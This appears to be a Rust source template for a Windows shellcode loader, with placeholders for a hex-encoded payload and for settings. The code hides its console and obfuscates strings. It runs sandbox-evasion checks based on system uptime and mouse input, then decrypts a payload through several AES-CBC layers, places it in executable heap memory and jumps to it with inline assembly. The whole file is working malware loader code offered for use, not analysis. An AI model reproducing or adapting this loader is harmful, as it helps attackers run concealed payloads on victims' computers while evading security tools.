#![windows_subsystem = "windows"]
extern crate alloc;

use alloc::ffi::CString;
use std::{mem, thread};
use std::arch::asm;
use std::mem::transmute;
use std::ptr::{null, null_mut};
use std::time::Duration;

use hex;
use libaes::Cipher;
use obfstr::obfstr as s;
use rand::Rng;
use winapi::um::heapapi::{HeapAlloc, HeapCreate};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::sysinfoapi::GetTickCount;
use winapi::um::winnt::{HEAP_CREATE_ENABLE_EXECUTE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READONLY};
use winapi::um::winuser::{GetCursorPos, GetLastInputInfo, LASTINPUTINFO, MOUSEMOVEPOINT};
use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize)]
pub struct ScInfo{
    base64_str:String,
    kv:Vec<(String,String)>
}

fn main() {
    unsafe {
        if !analy_environment() {
            thread::sleep(Duration::from_secs(10));
            return;
        }
    }
    thread::sleep(Duration::from_secs(2));
    //编译混淆
    let hexDecode = hex::decode(s!("${hexCode}")).expect("hex decode err");
    let sc_info: ScInfo = serde_json::from_slice(hexDecode.as_slice()).unwrap();
    let string = sc_info.base64_str;
    let map = sc_info.kv;
    let pairs = map.iter().rev();
    let mut  aesShellCode = base64::decode(string).unwrap();
    for (key, value) in pairs {
        aesShellCode = aesDecrypt(&key, &value, aesShellCode);
    }


    thread::sleep(Duration::from_secs(1));
    let shellCode = &aesShellCode;

    let flen = shellCode.len();

    thread::sleep(Duration::from_secs(1));
    unsafe {
        let heap= HeapCreate(HEAP_CREATE_ENABLE_EXECUTE,0,0);
        let alloc = HeapAlloc(heap, 8, flen);
        std::ptr::copy_nonoverlapping(shellCode.as_ptr(), alloc as *mut u8, flen);

        let heap1= HeapCreate(HEAP_CREATE_ENABLE_EXECUTE,0,0);
        let alloc1 = HeapAlloc(heap1, 8, flen);
        std::ptr::copy_nonoverlapping(alloc as *mut u8, alloc1 as *mut u8, flen);


        let jmp_target = alloc1.offset(0 as isize);
        asm!("jmp {}", in(reg) jmp_target)
    }
}

pub fn aesDecrypt(key: &String, iv: &String, ciphertext: Vec<u8>) -> Vec<u8> {
    let cipher = Cipher::new_128(key.as_bytes()[0..16].try_into().unwrap());
    cipher.cbc_decrypt(iv.as_bytes(), &ciphertext)
}

pub unsafe fn analy_environment() -> bool {
    let tick_count = GetTickCount();
    let v1= ${tick_count};
    if i64::from(tick_count) <= v1 && v1>0 {
        println!("开机时间过短");
        return false;
    }
    println!("系统启动以来的毫秒数: {}", tick_count);
    let mut last_input_info: LASTINPUTINFO = LASTINPUTINFO {
        cbSize: mem::size_of::<LASTINPUTINFO>() as u32,
        dwTime: 0,
    };
    last_input_info.cbSize = mem::size_of::<LASTINPUTINFO>() as u32;
    let v2= ${mouse_movement_detection};
    if !v2 {
        return true;
    }

    if GetLastInputInfo(&mut last_input_info as *mut LASTINPUTINFO) != 0 {
        let last_input_time = last_input_info.dwTime;
        let system_uptime = GetTickCount();
        if system_uptime - last_input_time > 0 {
            println!("鼠标从开机后移动过");
            return true;
        } else {
            println!("鼠标从开机后未移动过");
            return false;
        }
    }


    return false;
}


